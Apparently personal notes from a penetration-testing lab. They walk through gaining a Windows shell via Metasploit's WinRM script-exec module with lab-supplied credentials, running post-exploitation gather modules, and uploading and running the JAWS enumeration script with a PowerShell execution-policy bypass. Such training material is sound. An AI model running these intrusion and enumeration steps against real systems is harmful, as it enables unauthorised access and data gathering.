exploit 
nmap -sV -Pn -sS target
WINRM
We can gain access to the target system by authenticating with WinRM sever on the target system. This can be done through the use of a Metasploit module.

In order to save time, you have been provided with access to the following credentials to gain access to the target system (**administrator/tinkerbell**).
WINRM 
use exploit/windows/winrm/winrm_script_exec
username : administrator
password : tinkerbell
set vbs:  true
after exploit

- background
- use post/windows/gather/win_privs
	- This module will print if UAC is enabled, and if the current account 
	  is ADMIN enabled. It will also print UID, foreground SESSION ID, is 
	  SYSTEM status and current process PRIVILEGES.
- use post/windows/gather/enum_logged_on_users
	- This module will enumerate current and recently logged on Windows 
	  users
  - use post/windows/gather/checkvm
	  - This module attempts to determine whether the system is running 
	  inside of a virtual environment and if so, which one. This module 
	  supports detection of Hyper-V, VMWare, Virtual PC, VirtualBox, Xen, 
	  and QEMU.
- use post/windows/gather/enum_applications
- use post/windows/gather/enum_computers
- use post/windows/gather/enum_patches

-  Automating local enumeration with JAWS
	- **JAWS (Just Another Windows Enum Script)**.
- JAWS is an open-source PowerShell script designed to help penetration testers automate local enumeration and identify privilege escalation vectors on Windows systems.
- GitHub repository: https://github.com/411Hall/JAWS
- Once you have copied the script from the GitHub repo, navigate back to the Kali Linux system in your lab environment and create a new file with a text editor like leafpad.
- save the file as **jaws-enum.ps1**
- We can now navigate back to our meterpreter session and navigate to the C:\ drive by running the following command:


on attacker machine
- go github page
- copy script of jaws
- make file and paste the script
- name it jaws-enum.ps1

on victim machine 
- cd C:\\
We will then need to create the
Temp
directory by running the following command:
Command:
- mkdir Temp
Command:
- cd Temp
- upload /root/Desktop/jaws-enum.ps1
- shell
- 
```
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```
- download JAWS-Enum.txt
- collect information
As shown in the preceding screenshot, the **jaws-enum.ps1** script will run and save the results in to a file called **JAWS-Enum.txt**.

**Note:** JAWS will take a couple of minutes to complete the enumeration process, so do not be alarmed if the script looks like it has paused or stopped running.

Once the **jaws-enum.ps1** script is done, we can download the output file for analysis, this can eb done by running the following command:

- download JAWS-Enum.txt
the output file generated by jaws-enum.ps1 contains all relevant information about the target system that we would have otherwise had to have enumerated manually.
